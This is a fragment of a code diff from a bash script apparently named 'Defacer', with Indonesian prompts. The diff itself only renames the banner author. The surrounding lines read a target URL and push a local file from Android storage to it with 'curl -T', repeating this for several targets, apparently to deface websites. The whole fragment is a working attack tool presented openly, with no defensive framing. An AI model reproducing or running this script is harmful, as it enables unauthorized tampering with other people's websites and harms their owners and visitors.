@@ -202,7 +202,7 @@ curl -T /storage/emulated/0/$script $target5
 echo $cyan"     ["$green"+"$cyan"]"$red"==="$white"＞"$green"$target5"
 echo
 echo $white"  Masukan Target 6 !!!!"
-echo $white "╭─"$green"Mr@Kintil"$cyan" ~/Defacer"$white
+echo $white "╭─"$green"Mr.Jack"$cyan" ~/Defacer"$white
 read -p " ╰─$ " target6
 curl -T /storage/emulated/0/$script $target6
 echo $cyan"     ["$green"+"$cyan"]"$red"==="$white"＞"$green"$target6"
